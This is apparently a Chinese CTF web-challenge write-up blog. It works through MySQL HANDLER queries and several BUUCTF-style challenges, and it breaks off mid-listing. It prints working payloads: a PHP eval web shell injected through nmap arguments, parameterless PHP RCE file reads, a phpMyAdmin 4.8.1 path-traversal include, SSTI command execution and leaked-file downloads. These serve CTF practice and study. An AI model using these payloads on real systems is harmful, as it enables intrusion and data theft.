class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;表名 test</span><br><span class="line">mysql&gt; handler test open as c;    &#x2F;&#x2F;打开</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; handler c read &#96;PRIMARY&#96;&#x3D;(5);   &#x2F;&#x2F;查询主健</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  5 | def  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; handler c close;                &#x2F;&#x2F;关闭</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">mysql&gt; handler test open;       &#x2F;&#x2F;open</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read data first;    &#x2F;&#x2F;data索引，第一个记录</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  1 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read data next;   &#x2F;&#x2F;下一个记录</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  2 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read data prev;  &#x2F;&#x2F;前一个记录</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  1 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read data last;  &#x2F;&#x2F;最后一条记录</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  9 | yza  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read &#96;data&#96;&#x3D;(&quot;yza&quot;);</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  9 | yza  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read data&#x3D;(&quot;abc&quot;) limit 5;</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  1 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">|  2 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read first  limit 2;   &#x2F;&#x2F;头两个记录  ID索引</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  1 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">|  2 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read first  limit 3;</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  1 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">|  2 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">|  3 | abd  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">3 rows in set (0.15 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read first ;</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  1 | abc  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; handler test read data last limit 5;   &#x2F;&#x2F;data索引</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">| id | data | ts                  |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">|  9 | yza  | 2016-07-18 23:44:05 |</span><br><span class="line">|  8 | vwx  | 2016-07-18 23:44:05 |</span><br><span class="line">|  7 | stu  | 2016-07-18 23:44:05 |</span><br><span class="line">|  6 | pqr  | 2016-07-18 23:44:05 |</span><br><span class="line">| 10 | def  | 2016-07-18 23:44:05 |</span><br><span class="line">+----+------+---------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h1 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h1><p>来源：MRCTF2020</p>
<p>考察：php代码审计</p>
<p>首先绕过md5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg)</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?gg[]&#x3D;1&amp;id[]&#x3D;2</span><br></pre></td></tr></table></figure>
<p>其次绕过passwd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd&#x3D;1234567a</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="高明的黑客（未做）"><a href="#高明的黑客（未做）" class="headerlink" title="高明的黑客（未做）"></a>高明的黑客（未做）</h1><p>来源：强网杯2019</p>
<p>考察</p>
<h1 id="Online-Tool"><a href="#Online-Tool" class="headerlink" title="Online Tool"></a>Online Tool</h1><p>来源：BUUCTF2018</p>
<p>考察：文件上传</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/100711933">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p>
<p>escapeshellarg和escapshellcmd一起用时，没有考虑单引号的问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">传入的参数是：172.17.0.2&#39; -v -d a&#x3D;1</span><br><span class="line">经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\&#39;&#39; -v -d a&#x3D;1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http:&#x2F;&#x2F;php.net&#x2F;manual&#x2F;zh&#x2F;function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a&#x3D;1&#39;，即向172.17.0.2\发起请求，POST 数据为a&#x3D;1&#39;。</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</span><br></pre></td></tr></table></figure>
<p>之后蚁剑连接</p>
<h1 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="Easy Java"></a>Easy Java</h1><p>来源：RoarCTF2019</p>
<p>考察：信息泄露</p>
<p>登录页面，尝试sql注入，失败</p>
<p>打开help文档，URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Download?filename&#x3D;help.docx HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>此处经验：修改抓包方式为POST。</p>
<p>下载docx后无信息</p>
<p>报错是tomcat，请求tomcat的web.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Download?filename&#x3D;WEB-INF&#x2F;web.xml HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>得到服务器的类配置，注意到有一个类叫FlagController</p>
<p>根据tomcat下目录命名规则，请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Download?filename&#x3D;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>得到FlagController</p>
<p>用记事本打开为乱码，用UltraEdit打开<br>看到提示：Flag is near by。将前一段的字符串进行base64转码，得到flag</p>
<h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h1><p>来源：GXYCTF</p>
<p>考察：无参数RCE，git泄露</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42812036/article/details/104406481">https://blog.csdn.net/qq_42812036/article/details/104406481</a></p>
<p>使用dirmap扫描，发现有/.git/config文件，说明有git泄露</p>
<p>使用githack下载后，有index.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123; <span class="comment">// 需要提交exp变量</span></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// 不能使用伪协议</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// ?R表示引用当前表达式。此处表示形如a(b(c()))的表达式</span></span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// 过滤一些关键字</span></span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为正则过滤，所以不能使用伪协议，不能使用参数。判断本题为无参数RCE。</p>
<p>扫描当前目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(current(localeconv())));</span><br><span class="line"></span><br><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .git [3] &#x3D;&gt; flag.php [4] &#x3D;&gt; index.php )</span><br></pre></td></tr></table></figure>
<p>·payload1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>payload2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>


<h2 id="正则表达式的迭代"><a href="#正则表达式的迭代" class="headerlink" title="正则表达式的迭代"></a>正则表达式的迭代</h2><p>?R表示对当前表达式的引用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/[a-z,_]+\((?R)?\)/</span><br><span class="line">/ [a-z,_]+( [a-z,_]+() )</span><br></pre></td></tr></table></figure>


<h2 id="PHP下无参数RCE"><a href="#PHP下无参数RCE" class="headerlink" title="PHP下无参数RCE"></a>PHP下无参数RCE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir(directory[,sorting_order,context]) 列出 directory 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。要在内部移动指针，使用next()或prev()</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line">print_r() 打印结果</span><br><span class="line">highlight_file() 显示文件</span><br></pre></td></tr></table></figure>
<p>栗子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<h2 id="php下读取文件的函数"><a href="#php下读取文件的函数" class="headerlink" title="php下读取文件的函数"></a>php下读取文件的函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">readfile()</span><br><span class="line">file_get_content()</span><br></pre></td></tr></table></figure>
<h1 id="easy-web（未做，网上环境无法复现）"><a href="#easy-web（未做，网上环境无法复现）" class="headerlink" title="easy_web（未做，网上环境无法复现）"></a>easy_web（未做，网上环境无法复现）</h1><p>来源：安洵杯2019</p>
<p>考察：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|a@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(.&#x2F;bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h1 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h1><p>来源：GWCTF2019</p>
<p>考察：phpmyadmin4.18漏洞</p>
<p>扫描目录（这一步没实践出来，太多429）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u xxx -e &quot;*&quot;</span><br></pre></td></tr></table></figure>
<p>访问phpmyadmin</p>
<p>此时有一个phpmyadmin漏洞，访问URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="phpmyadmin-4-8-1-RCE"><a href="#phpmyadmin-4-8-1-RCE" class="headerlink" title="phpmyadmin 4.8.1 RCE"></a>phpmyadmin 4.8.1 RCE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>由于多了第二次的解码和判断，导致当传入二次编码的<code>?</code>（即<code>%253f</code>）时会取出导致db_sql.php作为参数从而绕过白名单进而达到文件读取的目的</p>
<h1 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h1><p>来源：BJDCTF2020</p>
<p>考察：git泄露，php源代码审计</p>
<p>使用githack下载源码（注意要在linux环境下以python2运行，windows下无法得到flag.php和index.php）</p>
<p>观察代码，index.php中关键字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$yds &#x3D; &quot;dog&quot;;</span><br><span class="line">$is &#x3D; &quot;cat&quot;;</span><br><span class="line">$handsome &#x3D; &#39;yds&#39;;</span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $y;</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $$y;</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>
<p>尝试提交多个变量进行flag值的传递，失败</p>
<p>利用$yds或者其他的exit的变量可传递出flag，不一定要执行到最后</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php?yds&#x3D;flag HTTP&#x2F;1.1</span><br><span class="line">Host: 2528bc7f-c4b6-4056-9cba-de0158304715.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 9</span><br><span class="line"></span><br><span class="line">flag&#x3D;flag</span><br></pre></td></tr></table></figure>
<h1 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h1><p>来源：BJDCTF2020</p>
<p>考察：SSTI</p>
<p>进入页面，有三个页面index.php，flag.php，hint.php</p>
<p>扫描目录，有.DS_Store，下载后无可用内容</p>
<p>hint.php提示修改ip</p>
<p>访问flag.php，添加X-Forwarded-For项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>返回了当面目录有哪些文件，说明可以执行SSTI</p>
<p>当前目录的flag.php没有答案，真正的flag在根目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&quot;cat ..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h1><p>来源：De1CTF2019</p>
<p>考察：python代码审计（md5函数的原理），hash扩展攻击</p>
<p>给源码做格式化处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 